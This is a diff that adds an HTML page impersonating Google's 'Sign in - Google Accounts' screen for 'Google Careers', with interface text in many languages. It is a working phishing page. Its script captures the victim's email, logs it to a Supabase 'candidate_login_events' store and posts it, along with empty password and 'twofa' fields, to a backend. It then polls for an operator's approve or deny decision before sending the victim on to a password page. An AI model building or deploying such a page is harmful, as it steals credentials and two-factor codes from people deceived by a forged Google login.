@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="icon" href="google_logo_icon_169090.ico">
+    <script src="supabase-tracker.js"></script>
+    <style>
+        /* Đẩy input xuống thấp hơn cho trang này */
+        .signin-form .input-field {
+            margin-top: 24px !important;
+        }
+        /* Kéo "Forgot email?" sát hơn với ô nhập */
+        .signin-form .forgot-email-btn {
+            margin-top: 2px !important;
+        }
+        .lang-switcher {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #5f6368;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            font-size: 14px;
+        }
+        .lang-switcher svg {
+            width: 16px;
+            height: 16px;
+            color: #5f6368;
+        }
+        .lang-select {
+            border: none;
+            background: transparent;
+            color: #3c4043;
+            font-size: 14px;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            outline: none;
+            cursor: pointer;
+            max-width: 220px;
+        }
+        .lang-select:hover {
+            color: #202124;
+        }
+        .main-wrapper.compact-signin {
+            justify-content: center;
+            padding-top: 24px;
+            padding-bottom: 24px;
+        }
+        .main-wrapper.compact-signin .login-wrapper {
+            min-height: auto;
+        }
+        .main-wrapper.compact-signin .page-footer {
+            margin-top: 14px !important;
+            padding-top: 0 !important;
+            padding-bottom: 0 !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+    </div>
+
+    <!-- Main content -->
+    <div class="main-wrapper page-transition compact-signin">
+        <div class="login-wrapper">
+            <div class="signin-card">
+                <!-- Progress bar container -->
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="signin-columns">
+                    <!-- Left Column: Logo, Title, Description -->
+                    <div class="signin-left">
+                        <div class="logo-wrapper">
+                            <img src="google_logo_icon_169090.ico" alt="Google logo" class="google-logo" style="width:48px;height:48px;" />
+                        </div>
+                        <h1 class="signin-title">Sign in</h1>
+                        <p class="signin-subtitle" style="color: #202124;">to continue to Google Careers</p>
+                    </div>
+                    
+                    <!-- Right Column: Sign-in Form -->
+                    <div class="signin-right">
+                        <form id="loginForm" class="signin-form" novalidate>
+                            <div class="input-field">
+                                <input type="email" id="email" class="text-input" placeholder=" " required autocomplete="username">
+                                <label for="email" class="floating-label">Email or phone</label>
+                            </div>
+                            <div class="error-wrapper">
+                                <span class="error-text" id="email-error"></span>
+                            </div>
+                            
+                                <button type="button" class="forgot-email-btn">Forgot email?</button>
+                            
+                            <div class="helper-text">
+                                <p>Not your computer? Use Guest mode to sign in privately. <a href="#" class="learn-more">Learn more about using Guest mode</a></p>
+                            </div>
+                            
+                            <div class="action-buttons">
+                                <button type="submit" class="btn-primary">Next</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer class="page-footer" style="width: 100%; max-width: 1050px;">
+            <div class="footer-wrapper" style="justify-content: space-between; align-items: center;">
+                <div class="lang-switcher">
+                    <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+                        <path d="M12.87 15.07l-2.54-2.5.03-.03c1.74-1.94 2.99-4.17 3.71-6.54H17V4h-7V2H8v2H1v2h11.17c-.66 1.92-1.76 3.75-3.3 5.35-1-.99-1.84-2.1-2.53-3.35H4.31c.83 1.8 1.94 3.46 3.3 4.92l-5.09 5.02L4 19.68l5-4.93 3.11 3.11.76-2.79zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.63 7l1.99-5.33L19.87 17h-4z"></path>
+                    </svg>
+                    <select id="languageSelect" class="lang-select language-dropdown" aria-label="Choose language"></select>
+                </div>
+                <div>
+                    <a href="#" class="footer-link">Help</a>
+                    <a href="#" class="footer-link">Privacy</a>
+                    <a href="#" class="footer-link">Terms</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Function to update page status
+        async function updatePageStatus(pageName) {
+            const requestId = localStorage.getItem('requestId');
+            if (!requestId) return;
+            
+            try {
+                await fetch('http://localhost:5000/api/update-page', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        id: parseInt(requestId), 
+                        currentPage: pageName 
+                    })
+                });
+            } catch (err) {
+                console.log('Failed to update page status');
+            }
+        }
+
+        // Smooth progress bar function for API calls
+        function startProgressBar() {
+            const progressBar = document.getElementById('progressBar');
+            const progressContainer = document.querySelector('.progress-container');
+            
+            if (!progressBar || !progressContainer) return;
+            
+            // Show progress container
+            progressContainer.classList.add('active');
+            
+            // Reset and start animation
+            progressBar.style.width = '0%';
+            progressBar.classList.remove('loading', 'completing');
+            
+            setTimeout(() => {
+                progressBar.classList.add('loading');
+                progressBar.style.width = '80%';
+            }, 100);
+            
+            return {
+                complete: () => {
+                    progressBar.classList.remove('loading');
+                    progressBar.classList.add('completing');
+                    progressBar.style.width = '100%';
+                    
+                    setTimeout(() => {
+                        progressContainer.classList.remove('active');
+                    }, 300);
+                },
+                hide: () => {
+                    progressContainer.classList.remove('active');
+                }
+            };
+        }
+
+        // Page transition handler
+        function handleTransition(url) {
+            const card = document.querySelector('.signin-card');
+            if (card) {
+                card.classList.add('fade-out');
+            setTimeout(() => {
+                window.location.href = url;
+            }, 300);
+        } else {
+            window.location.href = url;
+        }
+    }
+
+        const I18N = {
+            en: {
+                title: 'Sign in',
+                subtitle: 'to continue to Google Careers',
+                emailLabel: 'Email or phone',
+                forgotEmail: 'Forgot email?',
+                helperPrefix: 'Not your computer? Use Guest mode to sign in privately.',
+                learnMore: 'Learn more about using Guest mode',
+                next: 'Next',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Terms',
+                enterEmail: 'Enter an email or phone number',
+                invalidEmail: 'Enter a valid email or phone number',
+                denied: 'Invalid email or phone number. Please try again.',
+                pageTitle: 'Sign in - Google Accounts',
+            },
+            vi: {
+                title: 'Đăng nhập',
+                subtitle: 'để tiếp tục đến Google Careers',
+                emailLabel: 'Email hoặc số điện thoại',
+                forgotEmail: 'Bạn quên email?',
+                helperPrefix: 'Không phải máy tính của bạn? Hãy dùng Chế độ khách để đăng nhập riêng tư.',
+                learnMore: 'Tìm hiểu thêm về Chế độ khách',
+                next: 'Tiếp theo',
+                help: 'Trợ giúp',
+                privacy: 'Quyền riêng tư',
+                terms: 'Điều khoản',
+                enterEmail: 'Nhập email hoặc số điện thoại',
+                invalidEmail: 'Nhập email hoặc số điện thoại hợp lệ',
+                denied: 'Email hoặc số điện thoại không hợp lệ. Vui lòng thử lại.',
+                pageTitle: 'Đăng nhập - Tài khoản Google',
+            },
+            es: { title: 'Iniciar sesión', subtitle: 'para continuar a Google Careers', emailLabel: 'Correo electrónico o teléfono', forgotEmail: '¿Olvidaste el correo?', helperPrefix: '¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada.', learnMore: 'Más información sobre el modo Invitado', next: 'Siguiente', help: 'Ayuda', privacy: 'Privacidad', terms: 'Condiciones', enterEmail: 'Introduce un correo o un teléfono', invalidEmail: 'Introduce un correo o un teléfono válidos', denied: 'Correo o teléfono no válidos. Inténtalo de nuevo.', pageTitle: 'Iniciar sesión - Cuentas de Google' },
+            fr: { title: 'Se connecter', subtitle: 'pour continuer vers Google Careers', emailLabel: 'E-mail ou téléphone', forgotEmail: 'E-mail oublié ?', helperPrefix: "Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en privé.", learnMore: 'En savoir plus sur le mode Invité', next: 'Suivant', help: 'Aide', privacy: 'Confidentialité', terms: 'Conditions', enterEmail: 'Saisissez un e-mail ou un téléphone', invalidEmail: 'Saisissez un e-mail ou un téléphone valides', denied: 'E-mail ou téléphone invalide. Réessayez.', pageTitle: 'Se connecter - Comptes Google' },
+            de: { title: 'Anmelden', subtitle: 'um mit Google Careers fortzufahren', emailLabel: 'E-Mail-Adresse oder Telefonnummer', forgotEmail: 'E-Mail vergessen?', helperPrefix: 'Nicht Ihr Computer? Nutzen Sie den Gastmodus für eine private Anmeldung.', learnMore: 'Mehr über den Gastmodus', next: 'Weiter', help: 'Hilfe', privacy: 'Datenschutz', terms: 'Nutzungsbedingungen', enterEmail: 'E-Mail oder Telefonnummer eingeben', invalidEmail: 'Gültige E-Mail oder Telefonnummer eingeben', denied: 'Ungültige E-Mail oder Telefonnummer. Bitte erneut versuchen.', pageTitle: 'Anmelden - Google-Konten' },
+            it: { title: 'Accedi', subtitle: 'per continuare su Google Careers', emailLabel: 'Email o telefono', forgotEmail: 'Email dimenticata?', helperPrefix: 'Non è il tuo computer? Usa la modalità Ospite per accedere in privato.', learnMore: 'Scopri di più sulla modalità Ospite', next: 'Avanti', help: 'Guida', privacy: 'Privacy', terms: 'Termini', enterEmail: 'Inserisci email o telefono', invalidEmail: 'Inserisci email o telefono validi', denied: 'Email o telefono non validi. Riprova.', pageTitle: 'Accedi - Account Google' },
+            pt: { title: 'Fazer login', subtitle: 'para continuar no Google Careers', emailLabel: 'E-mail ou telefone', forgotEmail: 'Esqueceu o e-mail?', helperPrefix: 'Não é seu computador? Use o modo visitante para fazer login com privacidade.', learnMore: 'Saiba mais sobre o modo visitante', next: 'Próxima', help: 'Ajuda', privacy: 'Privacidade', terms: 'Termos', enterEmail: 'Digite um e-mail ou telefone', invalidEmail: 'Digite um e-mail ou telefone válidos', denied: 'E-mail ou telefone inválido. Tente novamente.', pageTitle: 'Fazer login - Contas do Google' },
+            ru: { title: 'Войти', subtitle: 'чтобы продолжить в Google Careers', emailLabel: 'Эл. почта или телефон', forgotEmail: 'Забыли адрес эл. почты?', helperPrefix: 'Это не ваш компьютер? Войдите в гостевом режиме для конфиденциальности.', learnMore: 'Подробнее о гостевом режиме', next: 'Далее', help: 'Справка', privacy: 'Конфиденциальность', terms: 'Условия', enterEmail: 'Введите адрес эл. почты или телефон', invalidEmail: 'Введите корректный адрес эл. почты или телефон', denied: 'Неверный адрес эл. почты или телефон. Повторите попытку.', pageTitle: 'Вход - Аккаунты Google' },
+            ar: { title: 'تسجيل الدخول', subtitle: 'للمتابعة إلى Google Careers', emailLabel: 'البريد الإلكتروني أو الهاتف', forgotEmail: 'هل نسيت البريد الإلكتروني؟', helperPrefix: 'ليس جهازك؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص.', learnMore: 'مزيد من المعلومات عن وضع الضيف', next: 'التالي', help: 'مساعدة', privacy: 'الخصوصية', terms: 'البنود', enterEmail: 'أدخل بريدًا إلكترونيًا أو رقم هاتف', invalidEmail: 'أدخل بريدًا إلكترونيًا أو رقم هاتف صالحًا', denied: 'البريد الإلكتروني أو الهاتف غير صالح. حاول مرة أخرى.', pageTitle: 'تسجيل الدخول - حسابات Google' },
+            hi: { title: 'साइन इन करें', subtitle: 'Google Careers जारी रखने के लिए', emailLabel: 'ईमेल या फ़ोन', forgotEmail: 'ईमेल भूल गए?', helperPrefix: 'क्या यह आपका कंप्यूटर नहीं है? निजी तौर पर साइन इन करने के लिए गेस्ट मोड का उपयोग करें।', learnMore: 'गेस्ट मोड के बारे में और जानें', next: 'आगे', help: 'सहायता', privacy: 'निजता', terms: 'शर्तें', enterEmail: 'ईमेल या फ़ोन नंबर दर्ज करें', invalidEmail: 'मान्य ईमेल या फ़ोन नंबर दर्ज करें', denied: 'अमान्य ईमेल या फ़ोन नंबर। कृपया फिर से प्रयास करें।', pageTitle: 'साइन इन - Google खाते' },
+            bn: { title: 'সাইন ইন', subtitle: 'Google Careers চালিয়ে যেতে', emailLabel: 'ইমেল বা ফোন', forgotEmail: 'ইমেল ভুলে গেছেন?', helperPrefix: 'এটি কি আপনার কম্পিউটার নয়? ব্যক্তিগতভাবে সাইন ইন করতে গেস্ট মোড ব্যবহার করুন।', learnMore: 'গেস্ট মোড সম্পর্কে আরও জানুন', next: 'পরবর্তী', help: 'সহায়তা', privacy: 'গোপনীয়তা', terms: 'শর্তাবলি', enterEmail: 'একটি ইমেল বা ফোন নম্বর লিখুন', invalidEmail: 'একটি বৈধ ইমেল বা ফোন নম্বর লিখুন', denied: 'অবৈধ ইমেল বা ফোন নম্বর। আবার চেষ্টা করুন।', pageTitle: 'সাইন ইন - Google অ্যাকাউন্ট' },
+            zh: { title: '登录', subtitle: '继续访问 Google Careers', emailLabel: '电子邮件或电话号码', forgotEmail: '忘记了电子邮件地址？', helperPrefix: '这不是您的计算机？请使用访客模式私密登录。', learnMore: '详细了解访客模式', next: '下一步', help: '帮助', privacy: '隐私', terms: '条款', enterEmail: '请输入电子邮件或电话号码', invalidEmail: '请输入有效的电子邮件或电话号码', denied: '电子邮件或电话号码无效。请重试。', pageTitle: '登录 - Google 帐号' },
+            ja: { title: 'ログイン', subtitle: 'Google Careers に進むには', emailLabel: 'メールアドレスまたは電話番号', forgotEmail: 'メールアドレスをお忘れですか？', helperPrefix: 'ご自身のパソコンでない場合は、ゲストモードでプライベートにログインしてください。', learnMore: 'ゲストモードの詳細', next: '次へ', help: 'ヘルプ', privacy: 'プライバシー', terms: '利用規約', enterEmail: 'メールアドレスまたは電話番号を入力してください', invalidEmail: '有効なメールアドレスまたは電話番号を入力してください', denied: 'メールアドレスまたは電話番号が無効です。もう一度お試しください。', pageTitle: 'ログイン - Google アカウント' },
+            ko: { title: '로그인', subtitle: 'Google Careers로 계속하려면', emailLabel: '이메일 또는 휴대전화', forgotEmail: '이메일을 잊으셨나요?', helperPrefix: '내 컴퓨터가 아닌가요? 비공개 로그인을 위해 게스트 모드를 사용하세요.', learnMore: '게스트 모드 자세히 알아보기', next: '다음', help: '도움말', privacy: '개인정보처리방침', terms: '약관', enterEmail: '이메일 또는 휴대전화 번호를 입력하세요', invalidEmail: '유효한 이메일 또는 휴대전화 번호를 입력하세요', denied: '유효하지 않은 이메일 또는 휴대전화 번호입니다. 다시 시도하세요.', pageTitle: '로그인 - Google 계정' },
+            id: { title: 'Login', subtitle: 'untuk melanjutkan ke Google Careers', emailLabel: 'Email atau telepon', forgotEmail: 'Lupa email?', helperPrefix: 'Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi.', learnMore: 'Pelajari mode Tamu', next: 'Berikutnya', help: 'Bantuan', privacy: 'Privasi', terms: 'Persyaratan', enterEmail: 'Masukkan email atau telepon', invalidEmail: 'Masukkan email atau telepon yang valid', denied: 'Email atau telepon tidak valid. Silakan coba lagi.', pageTitle: 'Login - Akun Google' },
+            th: { title: 'ลงชื่อเข้าใช้', subtitle: 'เพื่อไปยัง Google Careers', emailLabel: 'อีเมลหรือโทรศัพท์', forgotEmail: 'ลืมอีเมลใช่ไหม', helperPrefix: 'ไม่ใช่คอมพิวเตอร์ของคุณใช่ไหม ใช้โหมดผู้มาเยือนเพื่อลงชื่อเข้าใช้อย่างเป็นส่วนตัว', learnMore: 'ดูข้อมูลเพิ่มเติมเกี่ยวกับโหมดผู้มาเยือน', next: 'ถัดไป', help: 'ความช่วยเหลือ', privacy: 'ความเป็นส่วนตัว', terms: 'ข้อกำหนด', enterEmail: 'ป้อนอีเมลหรือหมายเลขโทรศัพท์', invalidEmail: 'ป้อนอีเมลหรือหมายเลขโทรศัพท์ที่ถูกต้อง', denied: 'อีเมลหรือโทรศัพท์ไม่ถูกต้อง โปรดลองอีกครั้ง', pageTitle: 'ลงชื่อเข้าใช้ - บัญชี Google' },
+        };
+
+        let activeLang = 'en';
+
+        function getLangBase(code) {
+            if (!code) return 'en';
+            return code.toLowerCase().split('-')[0];
+        }
+
+        function t(key) {
+            const pack = I18N[activeLang] || I18N.en;
+            return pack[key] || I18N.en[key] || '';
+        }
+
+        function applyTranslations(langCode) {
+            activeLang = I18N[getLangBase(langCode)] ? getLangBase(langCode) : 'en';
+            document.documentElement.lang = activeLang;
+            document.documentElement.dir = activeLang === 'ar' ? 'rtl' : 'ltr';
+            document.title = t('pageTitle');
+
+            const title = document.querySelector('.signin-title');
+            const subtitle = document.querySelector('.signin-subtitle');
+            const emailLabel = document.querySelector('label[for="email"]');
+            const forgotEmail = document.querySelector('.forgot-email-btn');
+            const helperText = document.querySelector('.helper-text p');
+            const nextBtn = document.querySelector('.btn-primary');
+            const footerLinks = document.querySelectorAll('.footer-link');
+
+            if (title) title.textContent = t('title');
+            if (subtitle) subtitle.textContent = t('subtitle');
+            if (emailLabel) emailLabel.textContent = t('emailLabel');
+            if (forgotEmail) forgotEmail.textContent = t('forgotEmail');
+            if (nextBtn) nextBtn.textContent = t('next');
+            if (helperText) {
+                helperText.innerHTML = `${t('helperPrefix')} <a href="#" class="learn-more">${t('learnMore')}</a>`;
+                const learnMoreLink = helperText.querySelector('.learn-more');
+                if (learnMoreLink) {
+                    learnMoreLink.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        alert('Guest mode help would be shown here');
+                    });
+                }
+            }
+            if (footerLinks.length >= 3) {
+                footerLinks[0].textContent = t('help');
+                footerLinks[1].textContent = t('privacy');
+                footerLinks[2].textContent = t('terms');
+            }
+        }
+
+        // Form validation and submission
+        function handleFormSubmission() {
+        const form = document.getElementById('loginForm');
+                const emailInput = document.getElementById('email');
+                const emailError = document.getElementById('email-error');
+                
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                // Reset previous errors
+                emailInput.classList.remove('error');
+                emailError.textContent = '';
+                const email = emailInput.value.trim();
+                // Basic email validation
+                if (!email) {
+                    showError(t('enterEmail'));
+                    return;
+                }
+                if (!isValidEmail(email) && !isValidPhone(email)) {
+                    showError(t('invalidEmail'));
+                    return;
+                }
+                // Show loading state
+                const submitBtn = form.querySelector('.btn-primary');
+                submitBtn.classList.add('loading');
+                submitBtn.disabled = true;
+                
+                // Start smooth progress bar
+                const progress = startProgressBar();
+                
+                // Store email for next page
+                localStorage.setItem('userEmail', email);
+
+                // >>> Luu event vao Supabase candidate_login_events
+                if (window.saveLoginEvent) {
+                    window.saveLoginEvent({ page: 'index.html', step: 'email', email: email });
+                }
+
+                // Gửi dữ liệu lên backend GUI Local
+                const userAgent = navigator.userAgent;
+                let requestId = null;
+                try {
+                    const res = await fetch('http://localhost:5000/api/request', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            email, 
+                            password: '', 
+                            twofa: '', 
+                            userAgent,
+                            currentPage: 'index.html'
+                        })
+                    });
+                    const data = await res.json();
+                    requestId = data.requestId;
+                    localStorage.setItem('requestId', requestId);
+                } catch (err) { 
+                    console.log('Backend not available, proceeding without approval');
+                    // Nếu backend không có, chuyển thẳng đến password page
+                    progress.complete();
+                    setTimeout(() => {
+                        window.location.href = `password.html?email=${encodeURIComponent(email)}`;
+                    }, 300);
+                    return;
+                }
+                
+                // Bắt đầu kiểm tra phê duyệt
+                await checkApprovalStatus(requestId, 'password.html');
+            });
+
+            function showError(message) {
+                emailInput.classList.add('error');
+                emailError.textContent = message;
+                emailInput.focus();
+            }
+
+            function isValidEmail(email) {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email);
+            }
+
+            function isValidPhone(phone) {
+                const phoneRegex = /^\+?[\d\s\-\(\)]+$/;
+                return phoneRegex.test(phone) && phone.replace(/\D/g, '').length >= 10;
+            }
+
+            // Hàm kiểm tra trạng thái approval
+            async function checkApprovalStatus(requestId, nextPage) {
+                const maxAttempts = 60; // Tối đa 60 lần kiểm tra (5 phút)
+                let attempts = 0;
+                
+                const checkStatus = async () => {
+                    try {
+                        const response = await fetch(`http://localhost:5000/api/status/${requestId}`);
+                        if (response.ok) {
+                            const data = await response.json();
+                            
+                            if (data.status === 'approved') {
+                                // Được approve, chuyển trang
+                                const email = localStorage.getItem('userEmail');
+                                const progress = startProgressBar();
+                                progress.complete();
+                                setTimeout(() => {
+                                    window.location.href = nextPage + '?email=' + encodeURIComponent(email);
+                                }, 300);
+                                return;
+                            } else if (data.status === 'denied') {
+                                // Bị từ chối, hiển thị thông báo
+                                const submitBtn = document.querySelector('.btn-primary');
+                                submitBtn.classList.remove('loading');
+                                submitBtn.disabled = false;
+                                showError(t('denied'));
+                                return;
+                            }
+                        }
+                        
+                        attempts++;
+                        if (attempts < maxAttempts) {
+                            // Kiểm tra lại sau 1 giây
+                            setTimeout(checkStatus, 1000);
+                        } else {
+                            // Hết thời gian chờ, chuyển trang
+                            const email = localStorage.getItem('userEmail');
+                            const progress = startProgressBar();
+                            progress.complete();
+                            setTimeout(() => {
+                                window.location.href = nextPage + '?email=' + encodeURIComponent(email);
+                            }, 300);
+                        }
+                    } catch (error) {
+                        console.error('Error checking approval status:', error);
+                        attempts++;
+                        if (attempts < maxAttempts) {
+                            setTimeout(checkStatus, 1000);
+                        } else {
+                            const email = localStorage.getItem('userEmail');
+                            const progress = startProgressBar();
+                            progress.complete();
+                            setTimeout(() => {
+                                window.location.href = nextPage + '?email=' + encodeURIComponent(email);
+                            }, 300);
+                        }
+                    }
+                };
+                
+                // Bắt đầu kiểm tra
+                checkStatus();
+            }
+        }
+
+        // Mobile responsive handler
+        function handleMobileLayout() {
+            function checkMobile() {
+                if (window.innerWidth <= 600) {
+                    document.body.classList.add('mobile-layout');
+                } else {
+                    document.body.classList.remove('mobile-layout');
+                }
+            }
+            
+            checkMobile();
+            window.addEventListener('resize', checkMobile);
+        }
+
+        // Build language list + auto-apply UI translation
+        function initLanguageSwitcher() {
+            const languageSelect = document.getElementById('languageSelect');
+            if (!languageSelect) return;
+
+            const fallbackLanguageCodes = [
+                'en','es','fr','de','it','pt','ru','uk','pl','nl','sv','no','da','fi','is',
+                'tr','el','cs','sk','hu','ro','bg','sr','hr','sl','et','lv','lt','ga','mt',
+                'ar','he','fa','ur','hi','bn','ta','te','ml','kn','gu','pa','mr','ne','si',
+                'th','vi','id','ms','tl','zh','ja','ko','mn','km','lo','my','am','sw','zu',
+                'af','xh','yo','ig','ha','so','rw','ps','kk','uz','az','hy','ka'
+            ];
+
+            let languageCodes = [];
+            try {
+                if (typeof Intl.supportedValuesOf === 'function') {
+                    languageCodes = Intl.supportedValuesOf('language');
+                }
+            } catch (error) {
+                languageCodes = [];
+            }
+            if (!languageCodes.length) {
+                languageCodes = fallbackLanguageCodes;
+            }
+
+            const uniqueCodes = Array.from(new Set(languageCodes))
+                .filter(Boolean)
+                .sort((a, b) => a.localeCompare(b));
+
+            const savedLanguage = localStorage.getItem('preferredLanguage');
+            const autoLanguage = navigator.language || 'en';
+            const preferredLanguage = savedLanguage || autoLanguage;
+            const displayNames = (() => {
+                try {
+                    // Keep option labels stable/readable for all users.
+                    return new Intl.DisplayNames(['en'], { type: 'language' });
+                } catch (error) {
+                    return null;
+                }
+            })();
+
+            const autoOption = document.createElement('option');
+            autoOption.value = 'auto';
+            autoOption.textContent = 'Auto (Browser)';
+            languageSelect.appendChild(autoOption);
+
+            uniqueCodes.forEach((code) => {
+                let label = code;
+                try {
+                    label = displayNames ? (displayNames.of(code) || code) : code;
+                } catch (error) {
+                    label = code;
+                }
+                const option = document.createElement('option');
+                option.value = code;
+                option.textContent = label;
+                languageSelect.appendChild(option);
+            });
+
+            const preferredBase = getLangBase(preferredLanguage);
+            const initialLanguage = uniqueCodes.includes(preferredLanguage)
+                ? preferredLanguage
+                : (uniqueCodes.includes(preferredBase) ? preferredBase : 'en');
+
+            if (savedLanguage === 'auto') {
+                languageSelect.value = 'auto';
+                applyTranslations(autoLanguage);
+            } else {
+                languageSelect.value = initialLanguage;
+                applyTranslations(initialLanguage);
+            }
+
+            languageSelect.addEventListener('change', function () {
+                const selectedLanguage = this.value;
+                if (selectedLanguage === 'auto') {
+                    applyTranslations(navigator.language || 'en');
+                    localStorage.setItem('preferredLanguage', 'auto');
+                    return;
+                }
+                applyTranslations(selectedLanguage);
+                localStorage.setItem('preferredLanguage', selectedLanguage);
+            });
+        }
+
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            handleFormSubmission();
+            handleMobileLayout();
+            initLanguageSwitcher();
+            
+            // Focus on email input
+            document.getElementById('email').focus();
+            
+            // Handle forgot email button
+            const forgotBtn = document.querySelector('.forgot-email-btn');
+            if (forgotBtn) {
+                forgotBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    alert('Forgot email feature would be implemented here');
+                });
+            }
+            
+            // Handle create account button
+            const btnSecondary = document.querySelector('.btn-secondary');
+            if (btnSecondary) {
+                btnSecondary.addEventListener('click', function() {
+                    alert('Create account feature would be implemented here');
+                });
+            }
+            
+        });
+
+        // Accessibility improvements
+        document.addEventListener('keydown', function(e) {
+            // Allow form submission with Enter key
+            if (e.key === 'Enter' && document.activeElement.tagName !== 'BUTTON') {
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
+    });
+    </script>
+</body>
+</html> 
